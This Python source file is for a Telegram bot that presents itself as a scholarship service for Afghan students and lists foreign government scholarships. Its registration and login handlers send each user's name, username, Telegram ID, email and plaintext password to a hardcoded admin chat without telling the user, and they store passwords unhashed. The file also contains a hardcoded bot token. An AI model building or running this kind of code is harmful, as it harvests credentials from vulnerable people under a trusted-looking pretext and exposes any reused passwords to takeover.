"""
Afghanistan Scholarships Bot - Updated
- Admin gets full details (name, username, ID, email, password) on registration
- Main menu now has a "📚 Scholarships" button showing available scholarships
"""

import logging
import json
import os
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler, ContextTypes, filters, CallbackQueryHandler

BOT_TOKEN = "8775552943:AAFGOaNpugfcGb-9yaepT6Ns-LerTygHGfM"
ADMIN_CHAT_ID = 6254547417  # @C4ptan

USERS_FILE = "users.json"
CHOOSE_ACTION, REGISTER_EMAIL, REGISTER_PASSWORD, LOGIN_EMAIL, LOGIN_PASSWORD = range(5)

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# ---- Scholarship list (edit these anytime) ----
SCHOLARSHIPS = [
    {
        "name": "🇹🇷 Turkish Government Scholarship (Türkiye Burslari)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "February 2025",
        "link": "https://turkiyeburslari.gov.tr"
    },
    {
        "name": "🇨🇳 Chinese Government Scholarship (CSC)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "March 2025",
        "link": "https://www.campuschina.org"
    },
    {
        "name": "🇷🇺 Russian Government Scholarship",
        "degree": "Bachelor / Master / PhD",
        "deadline": "March 2025",
        "link": "https://russia.study"
    },
    {
        "name": "🇭🇺 Stipendium Hungaricum (Hungary)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "January 2025",
        "link": "https://stipendiumhungaricum.hu"
    },
    {
        "name": "🇰🇷 Korean Government Scholarship (KGSP)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "September 2025",
        "link": "https://www.studyinkorea.go.kr"
    },
    {
        "name": "🇲🇾 Malaysian Technical Cooperation Programme",
        "degree": "Bachelor / Master",
        "deadline": "April 2025",
        "link": "https://www.mtcp.kln.gov.my"
    },
]

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

def main_menu():
    return ReplyKeyboardMarkup(
        [["📝 Create Account", "🔑 Log In"],
         ["📚 Scholarships"]],
        resize_keyboard=True
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎓 *Welcome to Afghanistan Scholarships!*\n\n"
        "We help Afghan students find and apply for scholarships worldwide.\n\n"
        "Please choose an option below:",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )
    return CHOOSE_ACTION

async def show_scholarships(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "📚 *Available Scholarships*\n\n"
    for i, s in enumerate(SCHOLARSHIPS, 1):
        msg += (
            f"*{i}. {s['name']}*\n"
            f"🎓 Degree: {s['degree']}\n"
            f"📅 Deadline: {s['deadline']}\n"
            f"🔗 [Apply Here]({s['link']})\n\n"
        )
    await update.message.reply_text(msg, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=main_menu())

async def choose_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if text == "📝 Create Account":
        await update.message.reply_text(
            "📝 *Create Account*\n\nPlease enter your email address:",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardRemove(),
        )
        return REGISTER_EMAIL

    elif text == "🔑 Log In":
        await update.message.reply_text(
            "🔑 *Log In*\n\nPlease enter your email address:",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardRemove(),
        )
        return LOGIN_EMAIL

    elif text == "📚 Scholarships":
        await show_scholarships(update, context)
        return CHOOSE_ACTION

    else:
        await update.message.reply_text("Please choose one of the options below:", reply_markup=main_menu())
        return CHOOSE_ACTION

async def register_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    if "@" not in email or "." not in email:
        await update.message.reply_text("That doesn't look like a valid email. Please try again:")
        return REGISTER_EMAIL
    users = load_users()
    if email in users:
        await update.message.reply_text("⚠️ This email is already registered. Please log in instead.", reply_markup=main_menu())
        return CHOOSE_ACTION
    context.user_data["reg_email"] = email
    await update.message.reply_text("✅ Good! Now enter a password (at least 6 characters):")
    return REGISTER_PASSWORD

async def register_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    if len(password) < 6:
        await update.message.reply_text("Password must be at least 6 characters. Try again:")
        return REGISTER_PASSWORD
    email = context.user_data.get("reg_email")
    user = update.effective_user
    users = load_users()
    users[email] = {
        "password": password,
        "telegram_id": user.id,
        "name": user.first_name or "",
    }
    save_users(users)

    # Confirm to user
    await update.message.reply_text(
        f"🎉 *Account Created Successfully!*\n\n"
        f"👤 Name: {user.first_name}\n"
        f"📧 Email: `{email}`\n\n"
        f"You can now log in anytime!",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )

    # Full details to admin
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=(
            f"🆕 *New Registration!*\n\n"
            f"👤 Name: {user.first_name} {user.last_name or ''}\n"
            f"🔗 Username: @{user.username or 'N/A'}\n"
            f"🆔 Telegram ID: `{user.id}`\n"
            f"📧 Email: `{email}`\n"
            f"🔐 Password: `{password}`"
        ),
        parse_mode="Markdown",
    )
    return CHOOSE_ACTION

async def login_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["login_email"] = update.message.text.strip()
    await update.message.reply_text("Enter your password:")
    return LOGIN_PASSWORD

async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    email = context.user_data.get("login_email")
    users = load_users()

    if email not in users:
        await update.message.reply_text("❌ No account found with that email.", reply_markup=main_menu())
        return CHOOSE_ACTION

    if users[email]["password"] != password:
        await update.message.reply_text("❌ Incorrect password. Try again.", reply_markup=main_menu())
        return CHOOSE_ACTION

    user = update.effective_user

    # Confirm to user
    await update.message.reply_text(
        f"✅ *Login Successful!*\n\n"
        f"👤 Name: {user.first_name}\n"
        f"📧 Email: `{email}`\n"
        f"🎓 Status: Active Member\n\n"
        f"Welcome back to Afghanistan Scholarships!",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )

    # Full details to admin
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=(
            f"🔑 *User Logged In!*\n\n"
            f"👤 Name: {user.first_name} {user.last_name or ''}\n"
            f"🔗 Username: @{user.username or 'N/A'}\n"
            f"🆔 Telegram ID: `{user.id}`\n"
            f"📧 Email: `{email}`\n"
            f"🔐 Password: `{password}`"
        ),
        parse_mode="Markdown",
    )
    return CHOOSE_ACTION

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled. Type /start to begin again.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_ACTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, choose_action)],
            REGISTER_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, register_email)],
            REGISTER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, register_password)],
            LOGIN_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_email)],
            LOGIN_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(conv)
    print("Afghanistan Scholarships Bot is running! Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
